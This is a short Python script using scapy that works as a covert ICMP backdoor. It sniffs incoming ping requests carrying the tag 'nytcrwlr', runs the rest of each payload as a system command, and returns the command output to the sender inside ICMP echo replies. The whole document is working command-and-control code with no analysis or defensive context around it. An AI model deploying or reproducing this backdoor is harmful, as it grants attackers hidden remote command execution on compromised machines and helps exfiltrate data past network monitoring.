#!/usr/bin/python

#server in indefinite loop sniffing for icmp request
#server gets icmp echo request with exact tag
#server calls processing fucntion and gets result
#server sends icmp response
#server keeps listening in loop again

try:
	from scapy.all import *
	import subprocess
	import sys
except Exception,e:
	print str(e)

def main():
	#make an infinite loop on listening function
	print "[+]entering inifinte loop..."
	while 1:
		#put code of listen here for simplicity
		print "[+]listening..."
		pkts = sniff(iface="eth0",timeout=10)
		for packet in pkts:
			if packet.haslayer(ICMP):
				if str(packet.getlayer(ICMP).type) == "8":
					command = packet.getlayer(Raw).load[0:]
					identity = command[0:8].strip("\r").strip("\n")
					print "Identity: " + identity
					cmd = command[8:].strip("\r").strip("\n")
					print "Acutal command: " + cmd
					if identity == "nytcrwlr":
						if cmd == "exit":
                	                                print "[+]Exit block"
                	                                sys.exit(0)
						else:
							cmd = cmd.split(" ")
							output = subprocess.check_output(cmd)
							dest = str(packet.getlayer(IP).src)
							icmp = ICMP()
							ip = IP()
							icmp.type = 0
							icmp.code = 0
							ip.dst = dest
							data = output
							print "[+]sending output and server sr1"
							sr1(ip/icmp/data,timeout=1)
							print "[+]done"

if __name__ == "__main__":
	main()
